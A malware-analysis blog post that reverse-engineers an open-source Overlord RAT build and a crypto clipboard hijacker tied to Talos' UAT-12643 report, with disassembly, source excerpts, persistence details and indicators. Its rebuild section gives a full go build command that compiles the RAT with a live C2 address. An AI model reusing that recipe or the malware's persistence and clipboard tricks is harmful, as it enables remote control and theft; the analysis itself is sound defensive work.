---
title: "UAT-12643's Overlord build is stock: it rebuilds byte for byte from the public source, and its Solana lookup is switched off"
date: 2026-11-18T20:06:15+00:00
slug: "overlord-uat-12643-stock-build"
description: "The one Overlord RAT file in Cisco Talos' UAT-12643 indicators is upstream Overlord 2.0.4, built with the framework's own builder flags. Recompiling commit b0c88f8 with the settings read out of the binary reproduces it to the same SHA-256. The Solana memo lookup and the blue-screen flag Talos describes are compiled in and turned off; the build talks straight to 41.216.188[.]11:5173 with the framework's development token. Also: five other Overlord builds, a Run-key bug, the clipper's wallets, and an extractor."
tags: ["overlord", "uat-12643", "golang", "reproducible-builds", "clipper", "solana"]
sample:
  family: "Overlord RAT (agent 2.0.4)"
  sha256: "b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c"
  source: "[Hybrid Analysis](https://www.hybrid-analysis.com/sample/b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c)"
toc: true
---

The Overlord RAT that Cisco Talos lists for UAT-12643 is not a variant. It is version 2.0.4 of the open-source Overlord framework, built from commit `b0c88f8` with Go 1.26.0 using exactly the flags the framework's own builder passes, and I can reproduce it: compiling that commit with the values its builder wrote into the binary gives a 9,035,776-byte file with the same SHA-256, `b7dfd524…`. The settings tell the rest. The Solana memo lookup that Talos presents as this variant's C2 resilience is compiled in and switched off, the "kill flag" that turns the process critical is switched off, and the agent connects straight to `wss://41.216.188[.]11:5173` with `dev-token-insecure-local-only`, the token from Overlord's development start-up scripts.

Talos published [the UAT-12643 report](https://blog.talosintelligence.com/uat-12643-suspected-north-korea-aligned-actor-blends-blockchain-resilience-with-targeted-infostealing/) on 2026-11-18. It covers the Overlord RAT, the public "Good Game" stealer and a C++ clipboard hijacker, with the indicators on [Talos' GitHub](https://github.com/Cisco-Talos/IOCs/tree/main/2026/11). None of the 11 hashes are on MalwareBazaar; Hybrid Analysis has two, the Overlord agent and the clipper, and both are analyzed here. The report doesn't say that Overlord is open source. [Proofpoint's June report on UNK_DeadDrop](https://www.proofpoint.com/us/blog/threat-insight/dont-fear-repo-unkdeaddrop-phishing-campaign-targets-developers-steal) does, and that is what made this post possible.

## What I found

- The agent's build settings are plain Go strings: server `41.216.188[.]11:5173`, Solana flag `false` with an empty address and RPC list, persistence `true`, critical process `false`, startup name `Sip`, a random-looking 24-character mutex, and the development token. The Solana code only runs when the flag, an address and an RPC endpoint are all set.
- Every one of the 522 named functions from the agent's packages exists in upstream 2.0.4, and a rebuild of commit `b0c88f8` (6 May 2026) with those values is byte-identical to the sample. The actor changed no code.
- In this version the registry persistence deletes itself: the agent writes an `OverlordAgent-<hex>` Run value and then, in the same call, removes every Run value with that prefix. Only the Startup-folder copy survives a reboot.
- None of the other Overlord agents I could read from a small MalwareBazaar sample turns the Solana lookup on either. One turns the critical-process flag on; it points at the source's default `127.0.0.1` and looks like a hand-made test build.
- The clipper replaces Bitcoin, Ethereum, `bnb`, Solana and Tron addresses with four wallets (the Ethereum one twice). Its XRP, Cardano, Dogecoin, Litecoin and Monero slots are empty, so copying one of those addresses empties the clipboard.

## The agent keeps its Go names

The file is a 9,035,776-byte x64 Go executable with its pclntab, the table Go uses for stack traces, intact: 9,094 functions with their full names. The module build information is also there:

```text {title="build info strings"}
go1.26.0
path	overlord-client/cmd/agent
mod	overlord-client	(devel)
build	-tags=noprint,persist_startup,persist_registry
build	-trimpath=true
build	CGO_ENABLED=0
build	GOOS=windows
```

`overlord-client/cmd/agent` is the upstream package path, and the three build tags are ones Overlord's builder adds: `noprint` for its "disable printing" option, and one `persist_*` tag per persistence method ticked in the build form. The PE subsystem is GUI, which is what the builder's "hide console" option (`-H=windowsgui`) produces. No garble, which the builder offers as a checkbox.

The repository Proofpoint named, `vxaboveground/Overlord`, no longer exists on GitHub. Several copies do; one, `doesntbreaktos/Overlord`, keeps what looks like the full history (829 commits, 5 March to 7 September 2026), and that is the source I compared against.

## The builder writes its settings as plain strings

Overlord's server builds each agent with `go build -ldflags "-X …"`, overwriting a set of package-level string variables in `config/config.go`:

```go {title="Overlord-Client/cmd/agent/config/config.go at b0c88f8 (excerpt)"}
var AgentVersion = "2.0.4"

var DefaultPersistence = "false"
var DefaultServerURL = "wss://127.0.0.1:5173"
var DefaultServerURLIsRaw = "false"
var DefaultServerURLIsSol = "false"
var DefaultSolAddress = ""
var DefaultSolRPCEndpoints = ""
var DefaultMutex = ""
var DefaultAgentToken = ""
var DefaultBuildTag = ""
var DefaultSleepSeconds = "0"
var DefaultCriticalProcess = "false"
```

A Go string variable is a 16-byte header, pointer and length. `config.Load` reads most of them right after checking an `OVERLORD_*` environment variable of the same meaning, so the disassembly labels itself:

```asm {title="config.Load, Solana settings"}
0x1402cc109: lea rax, [rip + 0x1f44c8]  ; "OVERLORD_SERVER_SOL"
0x1402cc110: mov ebx, 0x13
0x1402cc115: call 0x1401037a0  ; os.Getenv
...
0x1402cc125: mov rax, qword ptr [rip + 0x5897d4]  ; (1) 0x140855900 -> "false"
0x1402cc12c: mov rbx, qword ptr [rip + 0x5897d5]
0x1402cc133: call 0x1402cd300  ; config.isTruthy
0x1402cc13c: lea rax, [rip + 0x1f52cf]  ; "OVERLORD_SOL_ADDRESS"
...
0x1402cc157: mov rax, qword ptr [rip + 0x5a8fb2]  ; (2) 0x140875110 -> ""
0x1402cc17a: lea rax, [rip + 0x1fa4d9]  ; "OVERLORD_SOL_RPC_ENDPOINTS"
...
0x1402cc195: mov rax, qword ptr [rip + 0x5a8f84]  ; (3) 0x140875120 -> ""
```

The Solana flag (1) points at the string `false`. The address (2) and RPC list (3) are empty: their headers sit past the end of `.data`'s raw bytes (raw data stops at RVA 0x873e00), in the zero-filled part, which is where Go leaves a string variable nobody set. Walking the rest of `config.Load` (persistence is read just before its environment check; the critical-process flag, version, build tag and sleep have none) and the persistence functions gives the full set:

| Variable | Header | Value |
|---|---|---|
| `DefaultServerURL` | 0x1408558e0 | `41.216.188[.]11:5173` |
| `DefaultServerURLIsRaw` | 0x1408558f0 | `false` |
| `DefaultServerURLIsSol` | 0x140855900 | `false` |
| `DefaultSolAddress` | 0x140875110 | empty |
| `DefaultSolRPCEndpoints` | 0x140875120 | empty |
| `DefaultAgentToken` | 0x140855920 | `dev-token-insecure-local-only` |
| `DefaultPersistence` | 0x1408558d0 | `true` |
| `DefaultCriticalProcess` | 0x140855950 | `false` |
| `DefaultMutex` | 0x140855910 | `1q_yMrvxBOTfCaitlzClfVyC` |
| `AgentVersion` | 0x1408558c0 | `2.0.4` |
| `DefaultBuildTag` | 0x140855930 | `0a6d1cf8-6aec-4f5e-952b-8d87ea36bda8` |
| `DefaultSleepSeconds` | 0x140855940 | `0` |
| `persistence.DefaultStartupName` | 0x140855960 | `Sip` |

The server value has no scheme; `normalizeServerURL` prepends `wss://`. The builder's code explains the other values. The mutex has the length and alphabet of `generateBuildMutex(24)`, the builder's random default (an operator can also type one). The build tag in this version is `uuidv4()`, random, with no date in it. The agent token is whatever the server process was started with, and `dev-token-insecure-local-only` is the value Overlord's `start-dev.bat` and `start-dev-server.sh` export. I think, from that, the operator ran the panel with the development scripts. The same `start-dev.bat` also sets `OVERLORD_DISABLE_AGENT_AUTH=true`.

## The Solana lookup is compiled in and switched off

Talos writes that "The Overlord RAT variant observed in this campaign implements a blockchain C2 resilience technique with Solana blockchain transactions", and describes the lookup in detail. That code is in the binary: `config.LoadServerURLsFromSolana`, `getSignatures`, `getMemoFromTransaction` and `decryptMemo` are all there. Every path to it checks the same three fields first:

```asm {title="main.refreshServerList"}
0x14038794e: cmp byte ptr [rax + 0x30], 0  ; (1) cfg.SolEnabled
0x140387952: je 0x14038796d
0x140387954: cmp qword ptr [rax + 0x40], 0  ; (2) len(cfg.SolAddress)
0x140387959: je 0x14038796d
0x14038795b: cmp qword ptr [rax + 0x50], 0  ; (3) len(cfg.SolRPCEndpoints)
0x140387960: je 0x14038796d
0x140387962: call 0x1403879a0  ; main.refreshServerURLsFromSolana
...
0x14038796d: call 0x140387de0  ; main.refreshServerURLsFromRaw
```

The offsets match the `Config` struct in the 2.0.4 source: `SolEnabled` at 0x30 (1), the address string's length at 0x40 (2), the endpoint slice's length at 0x50 (3). `main.ensureServerURLs` tests the same three, and so does `config.Load` in the source. With the flag `false` and both strings empty, none of them reaches the blockchain unless someone sets `OVERLORD_SERVER_SOL`, `OVERLORD_SOL_ADDRESS` and `OVERLORD_SOL_RPC_ENDPOINTS` in the agent's environment before it starts, and nothing Talos describes sets them. The agent dials the hard-coded server.

For builds that do turn it on, the memo format is in the source: base64, a 12-byte nonce, then AES-256-GCM ciphertext under the key SHA-256(agent token), decrypting to one URL per line. That differs from Talos' account, which has the RAT skip any instruction whose data isn't "exactly 43 characters in length", described as "the fixed string length produced when a Base58-encoded WebSocket URL is AES-256 encrypted". The 2.0.4 code takes the first non-empty memo from the Memo program and checks no length, and no version of `solana.go` in the mirror has a 43-character or Base58 check. I don't know which build that description came from. The extractor below prints the key and decrypts memos you give it.

## So is the blue-screen flag

Talos also describes a "kill flag" that makes the RAT a critical process, so that killing it crashes Windows. That is `criticalproc.Setup`, and it has exactly one caller:

```asm {title="main.main"}
0x140384bce: cmp byte ptr [rsp + 0x219], 0  ; (1) cfg.EnablePersistence
0x140384bd6: je 0x140384c7a
0x140384be0: call 0x1402e6d20  ; persistence.Setup
...
0x140384c7a: cmp byte ptr [rsp + 0x21a], 0  ; (2) cfg.CriticalProcess
0x140384c82: je 0x140384c89
0x140384c84: call 0x1402e5e20  ; criticalproc.Setup
```

`config.Load` returns the struct at `rsp+0x140` in `main.main`, so (1) and (2) are offsets 0xD9 and 0xDA, `EnablePersistence` and `CriticalProcess`. `config.Load` fills 0xDA from `strings.ToLower(DefaultCriticalProcess) == "true"`, with no environment override. The value is `false`. The privilege dance and the `NtSetInformationProcess` call that Talos walks through are real code in this file, but this build never runs `Setup`, so the critical flag is never set. (`criticalproc.Teardown`, reachable from the `uninstall` and `disconnect` commands, does call `NtSetInformationProcess` to clear it.)

## Finding the commit

`AgentVersion` says 2.0.4. Searching the history for that string finds the commit that set it and the one that replaced it:

```console
$ git log -S'AgentVersion = "2.0.4"' --format='%h %ad %s' --date=iso -- Overlord-Client/cmd/agent/config/config.go
63d0425 2026-05-07 09:53:17 -0500 2.0.5
b0c88f8 2026-05-06 22:00:12 -0500 2.0.4
```

Version 2.0.4 lasted 12 hours. The only commit between the two doesn't touch the client, so `b0c88f8` is the 2.0.4 agent source. Hybrid Analysis records the sample's submission on 24 July 2026, eleven weeks after upstream had moved past 2.0.4.

Before rebuilding, I compared function names: the 522 top-level functions from the binary's own packages against every `func` declared in the Windows build of that commit. One came out as present in the binary and missing from the source, `handlers.HandleElevate`, and for a few minutes it looked like the actor's addition. It wasn't. It lives in `elevate_other.go`, a file guarded by `//go:build !darwin`, which my filter had dropped along with Linux-only files whose names end in `_other`. With that file counted, all 522 are upstream.

A name match doesn't prove the bodies are unchanged. A rebuild does.

## Rebuilding it byte for byte

The server's `build-process.ts` shows exactly how it calls the compiler: `-trimpath`, `-buildvcs=false`, `-ldflags "-s -w -buildid= …"` plus one `-X` per setting, and the build tags from the form. Plugging in the values from the table:

```console
$ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build \
    -tags "noprint persist_startup persist_registry" -trimpath -buildvcs=false \
    "-ldflags=-s -w -buildid= -X $X/config.DefaultServerURL=41.216.188.11:5173 \
     -X $X/config.DefaultMutex=1q_yMrvxBOTfCaitlzClfVyC -X $X/config.DefaultPersistence=true \
     -X $X/persistence.DefaultStartupName=Sip \
     -X $X/config.DefaultAgentToken=dev-token-insecure-local-only \
     -X $X/config.DefaultBuildTag=0a6d1cf8-6aec-4f5e-952b-8d87ea36bda8 -H=windowsgui" \
    -o ref204.exe ./cmd/agent
$ sha256sum ref204.exe b7dfd524…
b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c  ref204.exe
b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c  b7dfd524…
```

(`$X` is `overlord-client/cmd/agent`; the toolchain is the go1.26.0 that `go.mod` asks for.) Same bytes. That works because Go builds are reproducible by design when nothing machine-specific gets in: `-trimpath` drops local paths, `-buildid=` empties the build ID, `-buildvcs=false` drops the commit stamp, `go.sum` pins every dependency, and with cgo off there is no C compiler in the loop. The only per-build inputs are the `-X` values, and they're all readable in the file.

So the UAT-12643 operator's contribution to this binary is what a builder form asks for: a server address, the name `Sip`, and a few checkboxes (persistence with two methods, no printing, hidden console). The flag set and the UUID build tag point to the panel's builder, though a hand-typed `go build` with the same flags would give the same bytes. Talos lists `Microsip-config.exe` files for the campaign's Python stealer; `Sip` may follow the same theme.

## What the build does when it starts

Because the binary is the source, the source is a fair description of its behavior, and three parts of it matter for responders.

Persistence first. With `persist_registry` and `persist_startup` both compiled in, `persistence.install` runs two installers. The registry one copies the agent to `%APPDATA%\Microsoft\DeviceSync\Sip.exe`, hides that folder, and writes `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OverlordAgent-<8 hex>` pointing at it. The startup one copies it to `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Sip.exe`. Then `install` does this:

```go {title="persistence_windows.go, install (b0c88f8)"}
for _, fn := range persistInstallFns {
	if err := fn(exePath); err != nil && firstErr == nil {
		firstErr = err
	}
}
_ = cleanupLegacyRunValues()
return firstErr
```

`cleanupLegacyRunValues` deletes every value under that Run key whose name is `OverlordAgent` or starts with `OverlordAgent-`, which includes the one written a moment earlier. The call order is the same in the binary (`call rcx` in the loop, then `call persistence.cleanupLegacyRunValues`), and the code is unchanged at the newest commit in the mirror (3.2.2, 7 September). I haven't seen this run, and there is no sandbox report for this file on Hybrid Analysis, but from the code a host should end up with the hidden DeviceSync copy, a Run value that existed for milliseconds, and `Sip.exe` in the Startup folder as the thing that actually starts it again. Talos describes the registry entry as the primary method and places the binary in "the Network folder" of the profile; in 2.0.4 that folder is `Microsoft\DeviceSync`.

The Windows Recovery Environment persistence Talos describes is `handleWinREInstall`, reached only from `handlers.HandleCommand` on the operator command `winre_install`. It doesn't happen on its own; the operator has to send it.

On the network side, in 2.0.4 `config.Load` starts from `tlsInsecureSkipVerify := true`, so unless `OVERLORD_TLS_INSECURE_SKIP_VERIFY` says otherwise the agent accepts any certificate on its WebSocket. The command dispatcher in `HandleCommand` switches on 94 action names, from `file_list` and `script_exec` to `hvnc_mouse_wheel` and `voice_downlink`; many are input events for the remote-desktop and hidden-desktop views, which is probably why Talos counts "35 commands, each corresponding to a distinct capability". Many of the short names don't appear as strings in the binary at all, because Go compiles a string `switch` into length checks and immediate compares.

## Five other Overlord builds

One build says little about how Overlord is used, so I took a small sample from MalwareBazaar. Its API returns the newest 100 files per query; the OverlordRAT signature and two tags gave 106 distinct files, 68 of them executables over 5 MB, and I took the first of those in each half-month from June to November: 11 files. Five are MSVC, MinGW or .NET files I didn't unpack. One, `f34ccaab`, is a 44 MB Go file with no pclntab magic, scrambled type names and Overlord's `msgpack` field tags: probably a garbled agent, which I couldn't read. The other five are readable agents:

| Build | Version | Server | Solana | Critical | Startup name |
|---|---|---|---|---|---|
| cc85777c | 2.3.3 | `34xuhusr8a.localto[.]net:2072` | off | off | `svchost` |
| 4320692c | 2.3.12 | `panel.tberat-vac[.]com` | off | off | default (`ovd_` + hex) |
| ef1c7270 | 3.1.0 | `wss://127.0.0.1:5173` | off | **on** | `svhost` |
| 8b2c1bb8 | 3.2.2 | `weteelectricpower[.]com` | off | off | none (persistence off) |
| fa86ec22 | fork | `spacex1337-client` package, not parsed | no Solana code | | |

None of the four upstream builds turns on the Solana lookup, and the fork has no Solana functions or strings at all. The one with the critical-process flag on (I checked its struct offsets the same way as above, for the 3.1.0 layout) has an empty build tag, mutex and agent token and the server default from `config.go`; the 3.1.0 builder always writes a signed build tag, so this looks like a hand-made build from source, probably a test. In the 2.3.x and 3.2.2 builds the build tag is no longer a bare UUID but a JWT-shaped token (two base64url parts joined by a dot) whose first part decodes to `{"v":1,"bid":"<uuid>","uid":N,"iat":<unix time>}`; `uid` is 7 in one build and 1 in two others.

The 3.2.2 build was a wrong turn of a different kind. My function-address helper took the pclntab's empty text-start field (0 in both the Go 1.26 and 1.27 builds) to mean "Go code begins at the start of `.text`", which held for the UAT-12643 file and produced nonsense here: `config.Load` apparently calling `syscall.Open` and itself. That build is linked by an external linker (it has `.eh_frame`, `.tls` and `.edata` sections), so Go's code begins partway into `.text`. The reliable base is the `text` field of Go's `moduledata`, found next to the pointer to the pclntab. The extractor uses that.

## The clipboard hijacker's wallets

The clipper `f1e51740` is a 148,987-byte MinGW x64 build that still carries its DWARF sections, so the decompiler shows the original global names: `BTC_key`, `BTC_len` and so on for ten coins. Each wallet is XORed with one byte, decoded by a three-line loop into a stack buffer:

```c {title="XhwZiLXDWZZU (Ghidra)"}
for (local_c = 0; local_c < param_3; local_c = local_c + 1) {
  *(byte *)(param_1 + local_c) = *(byte *)(param_2 + local_c) ^ param_4;
}
```

Every 500 ms the main loop reads the clipboard, picks a coin by the text's prefix and length, decodes that coin's slot, and writes it back:

| Trigger | Key | Replacement |
|---|---|---|
| starts `1`, `3` or `bc1`, 26 to 42 chars | 0x07 | `bc1qwun0d0mvtynq9jhtzmd0n6sauwf23yggww0xdw` |
| starts `0x`, 42 chars | 0x73 | `0xA15B818E6C2Ab20B8FAe65ccdE99ef7E9304Ed03` |
| starts `bnb`, 40 to 50 chars | 0x19 | the same `0xA15B…Ed03` |
| exactly 44 chars, anything | 0xdc | `oeiHWBqrptieAkp8LjYt59ZEzNqMAyXqFz6p4GzUCva` |
| starts `T`, 34 chars | 0x93 | `TMhXxV8sAURsmHhmvsh26iToP8QbR9zJHr` |
| XRP, ADA, DOGE, LTC, XMR patterns | various | empty string |

Two of these rows behave worse than intended. The Solana test is only "length 44", so any 44-character string copied on the machine that doesn't match an earlier rule becomes the Solana address. And the five coins in the last row have their buffers and lengths in `.bss`: the code reads them and nothing ever writes them, so the "decoded" wallet is an empty string, and the clipper empties the clipboard instead. Copying a Monero address on an infected machine pastes nothing.

Before any of that, `WinMain` takes the mutex `Global\UuuRjinBZPBMIjnc`, copies itself to `%APPDATA%\MsgEdgeUpdate.exe` (hidden, system), adds a `MsgEdgeUpdate` Run value through `reg.exe`, and only then checks the computer name for `VBOX`, `VMWARE`, `QEMU` or `SANDBOX` and calls `IsDebuggerPresent`. On a sandbox it persists first and exits second (Talos lists the name check before persistence).

## What I couldn't determine

Talos' port table lists more Overlord file names on the actor's server (`Ovl.exe`, `Client.exe`) than its indicator file has hashes for. If another build there had Solana turned on, the report's description would fit that one; I only have the one in the list, and it doesn't. I also can't tell how this agent reached victims. Talos describes LNK, HTA and MSBuild downloaders, and the delivery hashes it lists aren't on MalwareBazaar or Hybrid Analysis. The persistence sequence above comes from the code; I have no execution trace of this file to confirm it. I didn't look at the Good Game stealer, which Talos identifies as a public project.

## The extractor

[`families/overlord`](https://github.com/stateless-re/tools/tree/main/families/overlord) in the tools repo reads these settings from Overlord Windows agents: it parses the pclntab, disassembles `config.Load` and assigns the string headers it loads by their order, which is the same in every upstream version from 2.0.4 to 3.2.2. It prints the memo key and decrypts memos passed with `--memo`, without touching the network. It handles the UAT-12643 agent and the four upstream agents above, and reports an error on the `spacex1337` fork and on the garbled `f34ccaab` ("no Go pclntab found"). Triage already extracts the server field for three of these builds; I found no public tool that reads the rest.

## Indicators

| SHA-256 | Role |
|---|---|
| `b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c` | UAT-12643 Overlord agent 2.0.4 (Talos list, Hybrid Analysis) |
| `f1e5174084bfded283b9dcf081615478e6941d12b652793197556beb72cc7588` | UAT-12643 clipboard hijacker (Talos list, Hybrid Analysis) |
| `cc85777c5439e314484d6314a89164bb7a723ec965246931303a78a0d2c1df35` | Overlord 2.3.3, other operator (MalwareBazaar) |
| `4320692c3d8740441eddb60c5fece7d15cb5fbb8ca1e4eb7199745223459878a` | Overlord 2.3.12, other operator (MalwareBazaar) |
| `ef1c7270096b4d0dffb394d09416320d12aa24b9d9b70f89998d90e42ac63098` | Overlord 3.1.0, test build (MalwareBazaar) |
| `8b2c1bb8bf0f960821acfcefb3d0707326faaf49bace8f389a9b531145fde100` | Overlord 3.2.2, other operator (MalwareBazaar) |
| `fa86ec228144b089dc8f507f81ddbf7f8bf69fac64c11348e2febea85719f2bb` | `spacex1337-client` fork (MalwareBazaar) |
| `f34ccaabd453d1a48109ea8f96b224c845ff03da08059db5ae5c63b3bf21bc15` | probable garbled Overlord agent (MalwareBazaar label OverlordRAT) |

| Type | Value | Context |
|---|---|---|
| C2 | `wss://41.216.188[.]11:5173` | UAT-12643 agent |
| C2 | `34xuhusr8a.localto[.]net:2072`, `panel.tberat-vac[.]com`, `weteelectricpower[.]com` | other operators' builds |
| Mutex | `1q_yMrvxBOTfCaitlzClfVyC` | UAT-12643 agent |
| Mutex | `Global\UuuRjinBZPBMIjnc` | clipper |
| Path | `%APPDATA%\Microsoft\DeviceSync\Sip.exe`, `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Sip.exe` | agent persistence |
| Registry | `HKCU\...\Run\OverlordAgent-<8 hex>` (written, then deleted) | agent persistence |
| Path, registry | `%APPDATA%\MsgEdgeUpdate.exe`, `HKCU\...\Run\MsgEdgeUpdate` | clipper persistence |
| Agent token | `dev-token-insecure-local-only` | UAT-12643 agent |
| Build tag | `0a6d1cf8-6aec-4f5e-952b-8d87ea36bda8` | UAT-12643 agent |
| BTC | `bc1qwun0d0mvtynq9jhtzmd0n6sauwf23yggww0xdw` | clipper |
| ETH / BNB slot | `0xA15B818E6C2Ab20B8FAe65ccdE99ef7E9304Ed03` | clipper |
| SOL | `oeiHWBqrptieAkp8LjYt59ZEzNqMAyXqFz6p4GzUCva` | clipper |
| TRX | `TMhXxV8sAURsmHhmvsh26iToP8QbR9zJHr` | clipper |

## ATT&CK

| ID | Technique | Here |
|---|---|---|
| T1547.001 | Registry Run Keys / Startup Folder | `Sip.exe` in the Startup folder; Run values `OverlordAgent-<hex>` (deleted again) and `MsgEdgeUpdate` |
| T1564.001 | Hidden Files and Directories | hidden `DeviceSync` folder; clipper copy marked hidden and system |
| T1036.005 | Match Legitimate Name or Location | clipper copies itself as `MsgEdgeUpdate.exe` |
| T1071.001 | Web Protocols | agent over WebSocket (`wss://`) to port 5173 |
| T1115 | Clipboard Data | clipper rewrites wallet addresses every 500 ms |
| T1497.001 | System Checks | clipper checks the computer name for VM and sandbox strings |
| T1622 | Debugger Evasion | clipper calls `IsDebuggerPresent` |

## Ending

Overlord's Solana dead drop and critical-process trick, which Talos presents as this variant's features, are both in this file, though the memo filter Talos describes is not the one in this code. Neither runs: the operator left two boxes unticked. When a sample is a stock build of public code, the build settings are the analysis, and for Go they're readable in a minute and verifiable by recompiling. For this campaign that means blocking `41.216.188[.]11:5173` covers this agent, and a `Sip.exe` in a Startup folder is the persistence to look for.

## Credits and further reading

- Cisco Talos (Chetan Raghuprasad), [UAT-12643: Suspected North Korea-aligned actor blends blockchain resilience with targeted infostealing](https://blog.talosintelligence.com/uat-12643-suspected-north-korea-aligned-actor-blends-blockchain-resilience-with-targeted-infostealing/), and the [indicator file](https://github.com/Cisco-Talos/IOCs/tree/main/2026/11).
- Proofpoint, [Don't Fear the Repo: UNK_DeadDrop Phishing Campaign Targets Developers to Steal Cryptocurrency](https://www.proofpoint.com/us/blog/threat-insight/dont-fear-repo-unkdeaddrop-phishing-campaign-targets-developers-steal), which identified Overlord as an open-source Go framework.
- Samples: the [agent](https://www.hybrid-analysis.com/sample/b7dfd524b305f476eebf5fc05c4689ed105df44e66353b0d21212a2192c9c26c) and the [clipper](https://www.hybrid-analysis.com/sample/f1e5174084bfded283b9dcf081615478e6941d12b652793197556beb72cc7588) from Hybrid Analysis; the other builds from [MalwareBazaar](https://bazaar.abuse.ch/browse/signature/OverlordRAT/).
